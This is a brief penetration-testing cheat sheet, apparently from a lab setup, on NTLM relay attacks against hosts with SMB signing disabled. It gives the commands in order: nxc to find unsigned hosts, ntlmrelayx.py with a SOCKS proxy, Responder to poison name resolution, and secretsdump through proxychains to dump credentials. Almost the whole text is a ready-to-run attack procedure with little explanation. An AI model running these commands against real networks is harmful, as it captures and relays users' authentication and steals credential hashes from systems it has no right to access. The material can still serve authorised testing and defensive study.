# NTLM Relay

Occurs when SMB signature is disabled

### Detect disabled SMB signing

```bash
nxc smb 192.168.56.0/24 --gen-relay-list unsigned_smb.txt
```

### Attack

Run ntlmrelayx.py (from the Impacket package):

```bash
sudo ntlmrelayx.py -t 192.168.56.22 -smb2support -socks
```

And at the same time Responder:

<pre><code><strong>sudo python Responder.py -I vboxnet0
</strong></code></pre>

After executing relay, we can use the SOCKS proxy to execute various commands in the context of that session

```bash
proxychains -q secretsdump.py
```
